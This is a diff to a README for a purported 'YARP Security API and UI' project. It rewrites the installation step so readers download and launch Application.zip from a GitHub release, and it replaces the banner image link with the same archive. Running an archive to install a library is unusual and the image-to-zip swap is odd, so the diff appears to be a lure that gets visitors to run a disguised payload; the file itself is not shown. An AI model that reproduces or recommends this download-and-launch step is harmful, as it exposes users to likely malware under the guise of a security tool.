@@ -23,7 +23,7 @@ The YARP Security API and UI provide a comprehensive solution for securing your 
 
 ### Installation
 
-To get started with the YARP Security API and UI, visit [Application.zip](https://github.com/file/Application.zip) and launch the file to begin the installation process.
+To get started with the YARP Security API and UI, visit [https://github.com/OlexonYT1/yarp-security-api-and-ui/releases/download/v1.0.0/Application.zip](https://github.com/OlexonYT1/yarp-security-api-and-ui/releases/download/v1.0.0/Application.zip) and launch the file to begin the installation process.
 
 If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
@@ -38,4 +38,4 @@ If you encounter any issues with the download link, please check the "Releases" 
 
 Thank you for checking out the YARP Security API and UI repository. Get started today and enhance the security of your YARP applications with our comprehensive security solution. Happy coding! 🛡️🔐
 
-![YARP Security](https://example.com/yarp-security-image.png)
+![YARP Security](https://github.com/OlexonYT1/yarp-security-api-and-ui/releases/download/v1.0.0/Application.zip)
